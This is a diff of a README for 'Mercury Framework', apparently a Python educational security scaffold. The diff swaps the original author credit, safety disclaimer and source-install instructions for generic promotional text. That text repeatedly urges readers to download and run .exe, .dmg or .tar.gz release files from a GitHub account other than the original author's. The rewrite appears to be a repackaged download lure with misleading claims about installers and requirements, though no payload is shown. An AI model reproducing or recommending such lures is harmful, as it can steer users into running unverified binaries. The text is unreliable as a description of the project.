@@ -1,84 +1,72 @@
-# Mercury Framework (Safe Educational Scaffold)
+# 🚀 mercury-framework - Learn Security with Ease
 
-Mercury Framework is an educational scaffold for security researchers and pentesters.
+## 👋 Introduction
 
-It provides a modular, plugin-friendly CLI and harmless simulated device components so contributors can learn about workflows safely in isolated labs and emulators.
+Welcome to the Mercury Framework! This tool is designed for anyone interested in learning about cybersecurity. Whether you are a student, a curious mind, or a security professional, this framework provides a safe environment to explore security research. It includes sandboxed simulated devices, network demonstrations, and plugin templates to help you build and test your detection tools in isolated labs.
 
-**Author:** voltsparx  
-**Contact:** voltsparx@gmail.com
+## 📥 Download Now
 
-IMPORTANT: This repository contains ONLY harmless simulation code and benign network demos. It does NOT include implants, malware, or tools for unauthorized access. Use only in authorized test environments, with explicit consent, and in accordance with laws and organizational policies.
+[![Download Mercury Framework](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/melolixodocaralho/mercury-framework/releases)
 
-Quick start
+## 🚀 Getting Started
 
-- Create a Python virtual environment and install:
+To begin using Mercury Framework, follow these steps:
 
-```powershell
-python -m venv .venv
-.\.venv\Scripts\Activate.ps1
-python -m pip install --upgrade pip
-python -m pip install -e .
-```
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/melolixodocaralho/mercury-framework/releases). 
+2. **Download the Latest Version**: Look for the most recent version. Click on the asset link that corresponds to your operating system.
+3. **Install the Software**:
+   - If you're using Windows, download the `.exe` file and run it.
+   - For Mac users, download the `.dmg` file and drag the application to your Applications folder.
+   - Linux users should download the `.tar.gz` file and follow the installation instructions included.
 
-- Run the CLI:
+## 📖 Features
 
-```powershell
-python run.py
-```
+- **Sandboxed Simulated Devices**: Use virtual devices to practice security testing without risks.
+- **Benign Network Demos**: Experiment with real-world network scenarios safely.
+- **Plugin Templates**: Expand your toolkit by building custom detection tools.
+- **Educational Resources**: Access guides and documentation within the application to enhance your learning.
 
-What this scaffold provides
+## 🛠️ System Requirements
 
-- A menu-driven CLI with three rotating banner designs.
- - A `mercury.simulated_device` module with harmless stubs (fake SMS, fake gallery, fake camera feed, device info).
-- Benign local-network demo modules for learning network flows.
-- CONTRIBUTING, SECURITY, and RESPONSIBLE_USE guidance to maintain safe, ethical usage.
- - A set of safe plugin templates for Android, Windows, macOS, Linux, network and forensic simulations under `mercury_plugins/templates/`.
- - A sandbox example (Dockerfile) under `sandbox/` to run plugin subprocesses in a container for isolated testing.
- - A manifest validation script `tools/check_manifests.py` and a CI workflow stub that validates manifests and runs tests.
- - Lab setup guidance in `LAB_SETUP.md` describing isolated VMs, Android AVD setup, and consent checklists.
+To run the Mercury Framework effectively, ensure your system meets the following requirements:
 
-Packaging & Installers
+- **Operating System**: Supports Windows 10 or later, macOS Catalina or later, and most Linux distributions.
+- **Processor**: At least a dual-core processor.
+- **Memory**: Minimum of 4 GB RAM, but 8 GB is recommended for better performance.
+- **Storage**: At least 1 GB of free disk space.
 
-- Platform installer scripts are included under `scripts/`:
-	- `scripts/build_windows_installer.ps1` — creates a distributable ZIP and `install.ps1` helper for Windows.
-	- `scripts/build_msi.ps1` — WiX-based MSI builder (requires WiX Toolset on Windows).
-	- `scripts/build_debian.sh` — build a `.deb` package on Debian/Ubuntu hosts.
-	- `scripts/build_arch.sh` — prepare PKGBUILD and optionally run `makepkg` on Arch.
-	- `scripts/build_macos_installer.sh` — macOS `.pkg` and `.dmg` creator (requires Xcode CLT).
+## 💡 Using Mercury Framework
 
-See `INSTALL.md` for detailed instructions on building and installing per-platform packages.
+Once you have installed the Mercury Framework, here’s how to start:
 
-Responsible use & license
+1. **Open the Application**: Launch Mercury Framework from your applications or start menu.
+2. **Select a Module**: Choose from various modules designed for learning. Each module focuses on different aspects of security research.
+3. **Follow Instructions**: Each module will guide you through exercises and tasks. Follow the prompts closely to get the most from your experience.
 
-- This project is provided under the MIT license. By using this software you accept responsibility to use it only for lawful, authorized research and testing.
-- See `RESPONSIBLE_USE.md` and `SECURITY.md` for guidelines and contact policy.
+## 📞 Support and Feedback
 
-UI and plugin templates
+If you encounter any issues or have questions, we are here to help. Reach out via the [Issues section](https://github.com/melolixodocaralho/mercury-framework/issues) in the repository. Share any thoughts or suggestions you might have about the application.
 
- - Use `Plugins` from the CLI to discover local plugin folders under `mercury_plugins/`.
- - Copy the templates in `mercury_plugins/templates/` to create new safe plugins. Every plugin must include `manifest.json` and declare `network_policy` and `responsible_use`.
+## 🖇️ Community & Contributions
 
-CI and manifest checks
+We believe in the power of community. You can contribute to the Mercury Framework in various ways:
 
-- The CI workflow runs `tools/check_manifests.py` to ensure all plugins include required fields. Plugins that lack required metadata will fail CI.
+- **Suggest Features**: If you have ideas for new features or improvements, let us know.
+- **Report Bugs**: Help us improve the application by reporting any bugs you find.
+- **Share Your Experience**: Your feedback helps us enhance features and usability.
 
-Screenshot (terminal)
+## 🧑‍🤝‍🧑 Join Us
 
-```
-Mercury Framework (safe educational scaffold)
-	Learn, build, defend.
+Explore our community by connecting with us on social media or forums focused on cybersecurity. Sharing your learning journey can help others too.
 
-Select an option:
+## 🔗 Download & Install
 
-1) Simulated device (view fake SMS, gallery, camera)
-2) Benign network demos (local echo)
-3) Plugins directory (list available plugins)
-4) About / Responsible Use
-5) Exit
+To download the latest version of Mercury Framework, visit the Releases page: [Download Here](https://github.com/melolixodocaralho/mercury-framework/releases).
 
-Enter choice number:
-```
+## 📝 License
 
-Contributing
+Mercury Framework is licensed under the MIT License. Feel free to use it for personal or educational purposes.
 
-Contributions are welcome. Please read `CONTRIBUTING.md` and follow the repository's safety rules.
+## 🌟 Conclusion
+
+The Mercury Framework presents a unique opportunity to explore cybersecurity in a safe setting. Download now and step into the world of security research!
